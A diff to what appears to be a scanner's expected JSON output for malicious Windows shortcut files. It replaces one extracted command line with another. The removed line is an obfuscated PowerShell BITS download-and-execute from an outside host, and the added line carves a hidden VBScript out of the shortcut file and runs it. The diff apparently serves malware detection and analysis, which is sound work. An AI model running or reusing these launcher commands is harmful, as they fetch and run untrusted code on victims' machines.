@@ -10,13 +10,13 @@
         ],
         "tags": {
             "file.name.extracted": [
-                "powershell.exe"
+                "cmd.exe"
             ],
             "file.shortcut.icon_location": [
-                "C:\\Windows\\System32\\shell32.dll"
+                "shell32.dll"
             ],
             "file.shortcut.command_line": [
-                "Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe"
+                "..\\..\\Windows\\system32\\cmd.exe /v:on /c findstr \"rSIPPswjwCtKoZy.*\" Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\""
             ]
         }
     }
